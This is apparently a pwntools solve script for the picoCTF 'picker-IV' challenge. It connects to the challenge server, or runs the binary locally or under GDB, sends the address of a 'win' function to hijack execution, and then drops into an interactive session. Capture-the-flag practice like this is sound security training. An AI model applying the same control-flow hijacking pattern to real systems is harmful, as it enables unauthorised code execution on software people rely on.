#!/usr/bin/env python3

from pwn import *

elf = ELF("./picker-IV_patched")

gs = '''
init-pwndbg
continue
'''

context.binary = elf

def conn():
    if args.GDB:
        return gdb.debug([elf.path], gdbscript=gs)
    elif args.LOCAL:
        return process([elf.path])
    else:
        return remote("saturn.picoctf.net", 55290)

io = conn()

def main():

    # good luck pwning :)

    #gdb.attach(io, gdbscript=gs)

    winfun = b'40129e'

    io.sendlineafter(b"'0x':", winfun)

    io.interactive()

if __name__ == "__main__":
    main()
